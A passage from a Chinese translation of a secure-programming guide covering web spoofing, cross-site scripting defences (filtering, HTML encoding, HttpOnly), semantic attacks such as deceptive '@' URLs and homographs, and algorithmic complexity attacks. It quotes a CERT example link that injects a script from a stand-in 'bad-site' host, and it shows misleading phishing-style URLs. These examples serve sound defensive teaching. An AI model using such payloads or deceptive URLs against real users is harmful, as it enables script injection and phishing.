结果表明，仅仅有一个可信路径到网络应用，特别是基于 Web 的应用，是不够的。有记录的方法可以欺骗 Web 浏览器的用户，让他们认为他们在一个地方，而实际上他们在一个完全不同的地方。例如，Felten [1997] 讨论了“Web 欺骗”，用户认为他们正在查看一个网页，而实际上他们查看的所有网页都通过攻击者的网站（攻击者可以监控所有流量并修改任何方向发送的数据）。这是通过重写 URL 来实现的。通过使用其他技术（如 JavaScript）来隐藏状态行、位置行等任何可能的证据，重写的 URL 可以变得几乎看不见。详见他们的论文以获取更多细节。隐藏此类 URL 的另一种技术是利用很少使用的 URL 语法，例如，URL“http://www.ibm.com/stuff@mysite.com”实际上是一个请求查看“mysite.com”（一个可能有害的网站）使用不寻常的用户名“www.ibm.com/stuff”。如果 URL 足够长，真实的内容就不会显示，用户可能根本不会注意到这个漏洞。另一种方法是为网站创建与“真实”网站名称故意相似的名字 - 用户可能不知道区别。在所有这些情况下，仅仅加密行是没有帮助的 - 攻击者完全可以在加密数据的同时完全控制显示的内容。

对抗这些问题更为困难；在此阶段，我还没有找到一种好的技术解决方案来完全防止“被欺骗”的网用户。我鼓励网页浏览器开发者对抗这种“欺骗”，使其更容易被发现。如果确保你的用户正确连接到正确的网站至关重要，让他们使用简单的程序来对抗这种威胁。例如，让他们停止并重新启动他们的浏览器，并确保网址非常简单且不会通常拼写错误（因此拼写错误的可能性很小）。你还可以尝试拥有一些“类似”发音的 DNS 名称，并搜索其他此类 DNS 名称和材料以找到攻击者。[某些版本的微软 Internet Explorer 完全不允许在 URL 中使用“@”符号](http://news.netcraft.com/archives/2004/01/28/microsoft_to_remove_support_for_usernames_in_http_urls.html)；这是一个不幸的限制，但可能对安全有益。另一种不那么严厉的解决方案可能是显示一个警告对话框，清楚地显示真实网站名称和用户名。

# 7.16\. 防止跨站（XSS）恶意内容

> [`dwheeler.com/secure-programs/Secure-Programs-HOWTO/cross-site-malicious-content.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/cross-site-malicious-content.html)

一些安全程序接受来自一个不受信任的用户（攻击者）的数据，并将这些数据传递给另一个用户的程序（受害者）。如果安全程序没有保护受害者，受害者的应用程序（例如，他们的网络浏览器）可能会以对受害者有害的方式处理这些数据。这对于使用 HTML 或 XML 的 Web 应用程序来说是一个特别常见的问题，这个问题有几个名称，包括“跨站脚本”、“恶意 HTML 标签”和“恶意内容”。本书将此问题称为“跨站恶意内容”，因为这个问题不仅限于脚本或 HTML，其跨站性质是根本性的。请注意，这个问题不仅限于 Web 应用程序，但由于这是它们的一个特定问题，接下来的讨论将侧重于 Web 应用程序。正如稍后将展示的，有时攻击者可以迫使受害者将数据从受害者发送到安全程序，因此安全程序必须保护受害者免受自身攻击。

## 7.16.1\. 问题解释

让我们从简单的例子开始。一些网络应用程序被设计为允许用户在数据输入中使用 HTML 标签，这些数据将被发布给其他读者（例如，在留言簿或“读者评论”区域）。如果不采取任何措施来防止这种情况，恶意用户可能会利用这些标签通过插入脚本、Java 引用（包括对敌对小程序的引用）、DHTML 标签、早期文档结束（通过</HTML>）、荒谬的字体大小请求等方式攻击其他用户。这种能力可以用于各种效果，例如暴露 SSL 加密连接、通过客户端访问受限网站、违反基于域的安全策略、使网页不可读、使网页使用不愉快（例如，通过令人讨厌的广告和攻击性材料），允许隐私侵犯（例如，通过插入一个网络虫子来了解谁确切地阅读了某个页面），创建拒绝服务攻击（例如，通过创建“无限”数量的窗口），甚至非常破坏性的攻击（通过在浏览器中插入针对脚本语言或缓冲区溢出的安全漏洞的攻击）。通过在合适的位置嵌入恶意表单标签，入侵者甚至可能诱使用户泄露敏感信息（通过修改现有表单的行为）。或者，通过嵌入脚本，入侵者可以造成无数的问题。这绝对不是问题清单的详尽无遗，但希望这足以让你相信这是一个严重的问题。

大多数“讨论板”都已经发现了这个问题，并且大多数已经在旨在成为多人讨论一部分的文本中采取措施防止它。不幸的是，许多 Web 应用程序开发者没有意识到这是一个更加普遍的问题。*每个*从一位用户发送到另一位用户的数据值都可能成为跨站恶意帖子的潜在来源，即使它不是一个“明显”的、预期可以包含任意 HTML 的区域。恶意数据甚至可以由用户自己提供，因为用户可能已经被欺骗通过另一个网站提供数据。以下是一个例子（来自 CERT）说明一个 HTML 链接会导致用户向另一个网站发送恶意数据：

```
  <A HREF="http://example.com/comment.cgi?mycomment=<SCRIPT
 SRC='http://bad-site/badfile'></SCRIPT>"> Click here</A>
```

简而言之，一个 Web 应用程序不能接受未经检查、过滤或编码的输入（包括任何表单数据）。在许多 Web 应用程序中，你甚至不能将数据回传给同一用户，因为另一个用户可能已经偷偷地提供了数据。即使允许这种材料不会伤害你的系统，它也会使你的系统成为攻击用户的中转站。更糟糕的是，这些攻击看起来就像是从你的系统发起的。

CERT 在其咨询中这样描述这个问题：

> 一个网站可能会无意中在基于不可验证的、来自不可信来源的动态生成的页面中包含恶意 HTML 标签或脚本（[CERT 咨询 CA-2000-02，客户端 Web 请求中嵌入的恶意 HTML 标签](http://www.cert.org/advisories/CA-2000-02.html)）。

关于此问题的更多信息，可以在 CERT 的网站上找到：[`www.cert.org/archive/pdf/cross_site_scripting.pdf`](http://www.cert.org/archive/pdf/cross_site_scripting.pdf)。论文[跨站脚本攻击的解剖](http://www.net-security.org/dl/articles/xss_anatomy.pdf)讨论了 XSS 的一些影响。

## 7.16.2\. 解决跨站恶意内容问题

从根本上说，这意味着所有受任何用户影响的 Web 应用程序输出都必须进行过滤（因此可以导致此问题的字符被移除）、编码（因此可以导致此问题的字符以防止问题的方式编码），或者验证（以确保只有“安全”的数据通过）。这包括所有从输入派生的输出，例如 URL 参数、表单数据、cookies、数据库查询、CORBA ORB 结果以及存储在文件中的用户数据。在许多情况下，过滤和验证应该在输入时完成，但编码可以在输入验证或输出生成期间完成。如果你只是传递数据而不进行分析，那么在输入时编码数据可能更好（这样就不会被遗忘）。然而，如果你的程序处理数据，那么在输出时编码可能更容易。CERT 建议在数据输出时进行过滤和编码；这并不是一个坏主意，但在许多情况下，在输入时进行操作更有意义。关键问题是确保你覆盖了所有输出情况，这无论采用何种方法都不是一件容易的事情。

警告 - 在许多情况下，除非你同时控制了输出字符编码，否则这些技术可能会被绕过。否则，攻击者可能会使用“意外”的字符编码来绕过这里讨论的技术。幸运的是，这并不难；在第 9.5 节中讨论了如何控制输出字符编码。

一种微小的防御措施，通常值得执行，是设置 cookies 的“HttpOnly”标志。在 Web 浏览器中运行的脚本无法访问设置了 HttpOnly 标志的 cookie 值（它们只会得到一个空值）。目前，这已在 Microsoft Internet Explorer 中实现，我预计 Mozilla/Netscape 也将很快实现这一功能。你应该为发送的任何 cookie 设置 HttpOnly，除非你有需要 cookie 的脚本，以防止某些类型的跨站脚本（XSS）攻击。然而，HttpOnly 标志可以通过多种方式绕过，因此将其作为主要防御措施是不合适的。相反，它是一个有用的辅助防御措施，可能会在应用程序编写不正确的情况下帮助你。

下面的第一个小节讨论了如何识别需要过滤、编码或验证的特殊字符。随后的小节描述了如何过滤或编码这些字符。然而，没有小节讨论如何一般性地验证数据，但是关于一般性的输入验证，请参阅第五章，如果输入是纯 HTML 文本或 URI，请参阅第 5.13 节。此外，请注意，你的 Web 应用程序可能会接收到恶意跨帖，因此非查询应该禁止 GET 协议（见第 5.14 节）。

### 7.16.2.1\. 识别特殊字符

这里列出了各种情况下的特殊字符（感谢 CERT 开发了这个列表）：

+   在块级元素的内容中（例如，在 HTML 文档中一段文本的中间或 XML 中的一个块）：

    +   "<" 是特殊的，因为它引入了一个标签。

    +   "&" 是特殊的，因为它引入了一个字符实体。

    +   ">" 具有特殊性，因为一些浏览器会将其视为特殊字符，基于这样的假设：页面作者本意是想插入一个开头的 "<"，但错误地省略了它。

+   在属性值中：

    +   在双引号包围的属性值中，双引号是特殊的，因为它们标志着属性值的结束。

    +   在单引号包围的属性值中，单引号是特殊的，因为它们标志着属性值的结束。XML 的定义允许使用单引号，但有人告诉我，一些 XML 解析器处理它们不正确，所以你可能应该避免在 XML 中使用单引号。

    +   没有引号的属性值使空白字符（如空格和制表符）变得特殊。注意，这些在 XML 中也是非法的，并且它们使更多的字符变得特殊。因此，如果你在动态生成的值中使用无引号的属性，我建议不要这样做。

    +   当与某些属性一起使用时，"&" 是特殊的，因为它引入了一个字符实体。

+   在 URL 中，例如，搜索引擎可能会在结果页面上提供一个链接，用户可以点击重新运行搜索。这可以通过在 URL 中编码搜索查询来实现。当这样做时，会引入额外的特殊字符：

    +   空格、制表符和换行符是特殊的，因为它们标志着 URL 的结束。

    +   "&" 是特殊的，因为它引入了一个字符实体或分隔 CGI 参数。

    +   非 ASCII 字符（即在 ISO-8859-1 编码中大于 128 的所有字符）不允许出现在 URL 中，因此在这里它们都是特殊的。

    +   "%" 必须从输入中过滤掉，因为服务器端代码在解码使用 HTTP 转义序列编码的参数时，这些百分号会被转换。如果输入如 "%68%65%6C%6C%6F" 在网页上显示为 "hello"，则必须过滤掉这些百分号。

+   在 <SCRIPT> </SCRIPT> 的内容中，分号、括号、花括号和换行符在文本可以直接插入到现有的脚本标签中的情况下应该被过滤。

+   将输入中的感叹号 (!) 转换为输出时的双引号 ("") 的服务器端脚本可能需要额外的过滤。

注意，通常来说，在 HTML 和 XML 中，"&" 符号是特殊的，因为它引入了一个字符实体。

### 7.16.2.2\. 过滤

处理这些特殊字符的一种方法就是简单地消除它们（通常在输入或输出时进行）。

如果你已经在验证输入的有效字符（你通常应该这样做），只需简单地从有效字符列表中省略特殊字符即可轻松完成。以下是一个 Perl 示例，它只接受合法字符，由于过滤器不接受任何特殊字符（除了空格），因此它非常适合用于引用属性等区域：

```
  # Accept only legal characters:
 $summary =~ tr/A-Za-z0-9\ \.\://dc;
```

然而，如果你只想移除**最少的字符**，那么你可以创建一个子程序来仅移除那些字符：

```
  sub remove_special_chars {
  local($s) = @_;
  $s =~ s/[\<\>\"\'\%\;\(\)\&\+]//g;
  return $s;
 }
 # Sample use:
 $data = &remove_special_chars($data);
```

### 7.16.2.3\. 编码（引用）

删除特殊字符的另一种方法是编码它们，使它们不具有任何特殊含义。这种方法相较于过滤字符有多个优点，尤其是它可以防止数据丢失。如果数据在用户看来被处理“损坏”，至少当数据被编码时，可以重建最初发送的数据。

HTML、XML 和 SGML 都使用和号（"&"）字符作为在运行文本中引入编码的方式；这种编码通常被称为“HTML 编码”。要编码这些字符，只需将你情况下的特殊字符进行转换。通常这意味着“<”变为“&lt;”，“>”变为“&gt;”，“&”变为“&amp;”，而“"”变为“&quot;”。如上所述，尽管在理论上“>”不需要引用，因为一些浏览器会对其做出反应（并填充一个“<”），所以它需要被引用。双引号字符存在一个小的复杂性，因为“&quot;”只需要在属性中使用，而且一些非常旧的浏览器不能正确渲染它。如果你能处理额外的复杂性，你可以尝试仅在需要时编码"'"，但简单地编码它并要求用户升级浏览器更容易。很少有用户会使用如此古老的浏览器，而且双引号字符编码已经是一个长期的标准。

脚本语言可以考虑实现专门的自动引号类型，这是在 Web 应用框架[Quixote](http://www.mems-exchange.org/software/quixote)中开发的一种有趣的方法。Quixote 包括一个“模板”功能，它允许轻松混合 HTML 文本和 Python 代码；由模板生成的文本被作为 HTML 文档传递回 Web 浏览器。截至版本 0.6，Quixote 有两种文本类型（而不是像大多数此类语言那样只有一种）。任何出现在字面、引号字符串中的内容都是“htmltext”类型，并且假定它正好是程序员想要的（这是合理的，因为程序员是这么写的）。然而，任何以普通 Python 字符串形式出现的内容，在模板执行时都会自动引号。因此，来自数据库或其他外部源的文字会自动引号，不能用于跨站脚本攻击。因此，Quixote 实现了一个安全的默认设置——程序员不再需要担心通过应用程序传递的每一块文本的引号（涉及过多引号的错误不太可能成为安全问题，并且在测试中会很明显）。Quixote 使用开源软件许可，但由于其场所标识，它可能不兼容 GPL，并被诸如[Linux Weekly News](http://lwn.net)之类的组织使用。

在某些情况下，这种方法对 HTML 编码来说还不够充分。如第 9.5 节中所述，您需要指定输出字符编码（“charset”）。如果您的某些数据使用与输出字符编码不同的字符编码进行编码，那么您需要做一些事情以确保您的输出使用一致和正确的编码。此外，如果您选择了除 ISO-8859-1 之外的输出编码，那么您需要确保任何特殊字符（如"<"）的替代编码不能泄露到浏览器中。这是一个与多个字符编码相关的问题，包括流行的 UTF-7 和 UTF-8；有关如何防止字符的“替代”编码的更多信息，请参阅第 5.11 节。处理不兼容的字符编码的一种方法是将字符首先内部转换为 ISO 10646（它与 Unicode 具有相同的字符值），然后使用数字字符引用或字符实体引用来表示它们：

+   数字字符引用看起来像“&#D;”，其中 D 是一个十进制数，或者“&#xH;”或“&#XH;”，其中 H 是一个十六进制数。给出的数字是 ISO 10646 字符 ID（它与 Unicode 具有相同的字符值）。因此，&#1048;是西里尔大写字母"I"。十六进制系统在 SGML 标准（ISO 8879）中不受支持，所以我建议使用十进制系统进行输出。此外，尽管 SGML 规范允许在某些情况下省略尾随的分号，但在实践中许多系统无法处理它——所以总是包括尾随的分号。

+   字符实体引用做的是同样的事情，但使用的是助记名称而不是数字。例如，“&lt;”代表“<”符号。如果你正在生成 HTML，请参阅[HTML 规范](http://www.w3.org)，其中列出了所有助记名称。

无论是数字系统还是字符实体系统都适用；我建议使用字符实体引用来表示“<”，“>”，“&”和“"”，因为这会使你的代码（和输出）更容易被人理解。除此之外，并不清楚哪一个系统在整体上更好。如果你预期人类会后来手动编辑输出，那么尽可能使用字符实体引用，否则我会使用十进制数字字符引用，因为它们更容易编程。这种编码方案对于某些语言（尤其是亚洲语言）可能相当低效；如果你的主要内容是这些语言，你可能选择使用不同的字符编码（charset），对关键字符进行过滤（例如，“<”），并确保不允许关键字符的替代编码。

URI 有自己的编码方案，通常称为“URL 编码”。在这个系统中，不允许在 URL 中使用的字符使用百分号后跟其两位十六进制值来表示。为了处理所有的 ISO 10646（Unicode），建议首先将代码转换为 UTF-8，然后进行编码。有关验证 URI 的更多信息，请参阅第 5.13.4 节。

# 7.17. 防范语义攻击

> [原文链接](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/semantic-attacks.html)

“语义攻击”是一种攻击，攻击者以欺骗受害者的方式使用计算基础设施/系统，使受害者认为他们在做某事，但实际上在做的是不同的事情，而计算基础设施/系统仍然按照其设计的方式工作。语义攻击通常涉及金融诈骗，攻击者试图欺骗受害者给攻击者大量金钱（例如，认为他们在投资某物）。例如，攻击者可能会试图说服用户他们正在查看一个受信任的网站，即使他们不是。

语义攻击难以防御，因为它们利用了计算机的正确操作。应对语义攻击的方法是帮助人类获得更多信息，这样当“奇怪”的事情发生时，人类将拥有更多信息，或者会显示警告，表明某些事情可能并非表面上看起来的那样。

一个例子是 URI，虽然合法，但可能会误导用户认为它们有不同的含义。例如，看看这个 URI：

```
   http://www.bloomberg.com@www.badguy.com
```

如果用户点击了这个 URI，他们可能会认为他们要去彭博社（提供金融商品新闻），但实际他们会去 www.badguy.com（提供用户名 www.bloomberg.com，而 www.badguy.com 会方便地忽略它）。如果 badguy.com 网站模仿了 bloomberg.com 网站，用户可能会相信他们看到的是真的（并基于攻击者控制的信息做出投资决策）。这取决于 URI 以不寻常的方式使用 - 可点击的 URI 可以有用户名，但通常没有。针对这种情况的一个解决方案是，网络浏览器检测到这种不寻常的 URI 并创建一个弹出确认小部件，显示“您即将以用户 www.bloomberg.com 的身份登录到 www.badguy.com；您希望继续吗？”如果小部件允许用户更改这些条目，它不仅为用户提供额外的功能，还能提供对该攻击的保护。

另一个例子是同形异义词，尤其是国际同形异义词。某些字母看起来很相似，这些也可以被利用。例如，由于 0（零）和 O（字母 O）看起来很相似，用户可能不会意识到 WWW.BLOOMBERG.COM 和 WWW.BL00MBERG.COM 是不同的网址。其他类似外观的字母包括 1（一）和 l（小写 L）。如果允许使用国际字符，情况会更糟。例如，许多西里尔字母在视觉上几乎与罗马字母相同，但计算机将它们视为不同。目前，大多数系统不允许在主机名中使用国际字符，但出于各种良好原因，普遍认为将来将需要支持它们。一个提议的解决方案是使用不同的颜色显示来自不同代码区域的字母 - 这样，用户在视觉上会得到更多信息。如果用户查看 URI，他们可能会希望注意到奇怪的着色。[Gabrilovich 2002] 网页[钓鱼 - 基于浏览器的防御](http://www.gerv.net/security/phishing-browser-defences.html)提供了针对这种攻击的另一组可能的防御措施。然而，这确实显示了语义攻击的本质 - 它难以防御，正是因为计算机工作得正确。

# 7.19\. 避免算法复杂性攻击

> [`dwheeler.com/secure-programs/Secure-Programs-HOWTO/complexity-attacks.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/complexity-attacks.html)

如果你的系统需要保持运行（并且不受拒绝服务攻击的影响），那么它需要设计成不会受到“算法复杂性攻击”的威胁。这些攻击利用了“典型情况”行为与最坏情况行为之间的差异；它们故意发送数据，导致算法持续显示最坏情况行为。例如，哈希表通常对所有操作都有 O(1) 的性能，但在许多实现中，攻击者可以构造输入，导致大量“哈希冲突”发生。其他可能受到攻击的常见算法包括排序例程（例如，快速排序的最坏情况是 O(n²) 而不是 O(n log n)）和正则表达式实现。许多高级功能都是建立在这些基本算法之上的（例如，许多搜索使用哈希表）。关于这种攻击的更多信息，请参阅 Crosby 和 Wallach 关于该主题的论文[Crosby 2003]。另请参阅第 5.2.3 节中关于正则表达式拒绝服务（REDoS）攻击的讨论。

有几种解决方案。一种方法是选择具有最佳最坏情况行为的算法，而不仅仅是最佳平均情况行为的算法；许多实时算法是专门设计来具有最佳最坏情况行为的，因此要寻找这些版本。Crosby 和 Wallach 提出了一种“通用哈希库”哈希函数，可以避免这个问题。尽管我没有看到它们能工作的证明，但简单的密钥哈希（即将要哈希的内容首先通过一个随机的本地密钥传递）应该是有效的，而加密密钥哈希应该非常有效——只是确保攻击者无法确定密钥。Judy 树可能是 b 树的有效替代品。
